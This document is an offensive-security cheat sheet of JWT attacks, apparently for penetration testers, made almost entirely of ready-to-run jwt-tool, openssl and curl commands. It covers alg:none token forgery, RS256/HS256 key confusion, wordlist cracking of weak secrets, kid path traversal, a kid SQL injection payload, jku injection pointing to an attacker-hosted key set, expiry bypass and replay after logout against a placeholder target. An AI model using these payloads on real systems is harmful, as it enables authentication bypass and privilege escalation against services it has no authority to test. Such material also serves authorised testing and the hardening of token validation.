# JWT Attacks — Annotated Examples

## JWT Inspection
```bash
# Decode header and payload (no signature verification)
TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMDQyIiwicm9sZSI6InVzZXIiLCJleHAiOjE3MDAwMDAwMDB9.SIGNATURE"
echo $TOKEN | cut -d. -f1 | base64 -d 2>/dev/null | jq .
# {"alg": "HS256", "typ": "JWT"}
echo $TOKEN | cut -d. -f2 | base64 -d 2>/dev/null | jq .
# {"sub": "1042", "role": "user", "exp": 1700000000}

# Full inspection with jwt-tool
jwt-tool $TOKEN -v
```

## None Algorithm Attack
```bash
# jwt-tool automates this
jwt-tool $TOKEN -X a
# Produces token with alg:none and no signature
# Try also: None, NONE, nOnE variants
```

Manual construction:
```bash
HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr '+/' '-_' | tr -d '=')
PAYLOAD=$(echo -n '{"sub":"1042","role":"admin","exp":9999999999}' | base64 | tr '+/' '-_' | tr -d '=')
TOKEN_NONE="${HEADER}.${PAYLOAD}."
echo $TOKEN_NONE
```

## HS256/RS256 Algorithm Confusion
```bash
# When original token uses RS256, try forging with public key as HMAC secret
# Extract public key from HTTPS certificate or JWKS endpoint
openssl s_client -connect target.com:443 2>/dev/null | openssl x509 -pubkey -noout > public.pem

# Use jwt-tool key confusion attack
jwt-tool $TOKEN -X k -pk public.pem
```

## Claim Tampering (HS256 with weak secret)
```bash
# Try common weak secrets
jwt-tool $TOKEN -C -d /usr/share/wordlists/nullai/common.txt

# If cracked (e.g., secret = "jwt_secret"):
jwt-tool $TOKEN -T -S hs256 -p "jwt_secret"
# Interactively modify: change "role":"user" to "role":"admin"
```

## kid Path Traversal
```bash
# Forge token with kid pointing to /dev/null (empty key)
jwt-tool $TOKEN -I -hc kid -hv "../../dev/null" -S hs256 -p ""
# Sign with empty string as HMAC key
```

## kid SQL Injection
```bash
# kid injected into SQL query to retrieve signing key
jwt-tool $TOKEN -I -hc kid -hv "' UNION SELECT 'attacker_secret' -- " -S hs256 -p "attacker_secret"
```

## jku Header Injection
```bash
# jwt-tool creates JWK and hosts it automatically (requires local server)
jwt-tool $TOKEN -X s

# Or manually:
# 1. Generate RSA key pair
openssl genrsa -out attacker_private.pem 2048
openssl rsa -in attacker_private.pem -pubout -out attacker_public.pem

# 2. Create JWKS JSON with your public key and host it
# 3. Create forged token pointing to your JWKS
jwt-tool $TOKEN -I -hc jku -hv "http://YOUR_OOB/jwks.json" -S rs256 -pr attacker_private.pem
```

## Expiry Bypass
```bash
# Set exp to far future
jwt-tool $TOKEN -I -pc exp -pv 9999999999 -S hs256 -p "known_secret"
```

## Replay After Logout
```bash
# 1. Login, capture token
# 2. Use token for authenticated request (confirm works)
# 3. Logout
# 4. Immediately retry same authenticated request with old token
curl -H "Authorization: Bearer $OLD_TOKEN" https://target.com/api/profile
# If 200 OK → token not invalidated on logout
```
